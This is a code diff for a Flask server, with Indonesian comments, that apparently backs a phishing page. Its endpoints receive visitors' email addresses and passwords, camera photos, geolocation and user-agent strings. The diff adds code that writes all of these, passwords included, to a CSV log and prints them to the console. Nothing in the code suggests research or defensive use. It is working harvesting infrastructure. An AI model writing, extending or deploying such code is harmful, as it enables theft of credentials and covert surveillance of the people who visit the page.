@@ -1,41 +1,47 @@
 from flask import Flask, render_template, request
-import os, base64
+import os, base64, csv
+from datetime import datetime
 
 app = Flask(__name__)
 CAPTURE_DIR = "captured_images"
+LOG_FILE = "log.csv"
+
 os.makedirs(CAPTURE_DIR, exist_ok=True)
+
+# Buat file CSV jika belum ada
+if not os.path.exists(LOG_FILE):
+    with open(LOG_FILE, "w", newline="") as f:
+        writer = csv.writer(f)
+        writer.writerow(["waktu", "jenis", "email", "password", "lat", "lon", "ua", "foto"])
 
 @app.route('/')
 def index():
     return render_template("index.html")
 
-# Terima foto awal
 @app.route('/berhasil_awal', methods=['POST'])
 def berhasil_awal():
     data = request.get_json()
-    if data and "photo" in data:
-        save_photo(data["photo"], "awal")
-    print("\n[DATA AWAL]")
-    print("Lokasi awal:", data.get("lat"), data.get("lon"))
-    print("User-Agent awal:", data.get("ua"))
+    foto_name = save_photo(data["photo"], "awal") if "photo" in data else ""
+    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    lat = data.get("lat", "")
+    lon = data.get("lon", "")
+    ua = data.get("ua", "")
+    tulis_csv(waktu, "awal", "", "", lat, lon, ua, foto_name)
+    print(f"[DATA AWAL] {lat}, {lon}, {ua}")
     return "OK"
 
-# Terima foto login + form index
 @app.route('/berhasil', methods=['POST'])
 def berhasil():
     photo = request.form.get("photo")
-    email = request.form.get("email")
-    password = request.form.get("password")
-    lat = request.form.get("lat")
-    lon = request.form.get("lon")
-    ua = request.form.get("ua")
-    if photo:
-        save_photo(photo, "login")
-    print("\n[DATA LOGIN]")
-    print("Email:", email)
-    print("Password:", password)
-    print("Lokasi login:", lat, lon)
-    print("User-Agent login:", ua)
+    email = request.form.get("email", "")
+    password = request.form.get("password", "")
+    lat = request.form.get("lat", "")
+    lon = request.form.get("lon", "")
+    ua = request.form.get("ua", "")
+    foto_name = save_photo(photo, "login") if photo else ""
+    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    tulis_csv(waktu, "login", email, password, lat, lon, ua, foto_name)
+    print(f"[DATA LOGIN] {email}, {password}, {lat}, {lon}, {ua}")
     return "OK"
 
 @app.route('/form_laporan')
@@ -50,10 +56,17 @@ def save_photo(photo_data, label):
         path = os.path.join(CAPTURE_DIR, filename)
         with open(path, "wb") as f:
             f.write(data)
-        print(f"Foto disimpan: {path}")
+        return filename
     except Exception as e:
         print("Gagal simpan foto:", e)
+        return ""
+
+def tulis_csv(waktu, jenis, email, password, lat, lon, ua, foto):
+    with open(LOG_FILE, "a", newline="") as f:
+        writer = csv.writer(f)
+        writer.writerow([waktu, jenis, email, password, lat, lon, ua, foto])
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+        
